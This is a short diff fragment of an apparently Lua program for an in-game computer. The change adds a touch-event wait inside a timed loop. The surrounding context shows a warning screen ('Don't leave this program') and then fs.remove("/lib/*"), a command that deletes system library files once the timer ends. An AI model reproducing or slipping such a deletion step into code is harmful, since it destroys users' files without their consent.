@@ -50,7 +50,7 @@ gpu.set(30, 12, "3. Don't leave this program")
 
 
 while comp.uptime() - startTime < seconds do
-
+  event.pull("touch")
 end
 
 fs.remove("/lib/*")
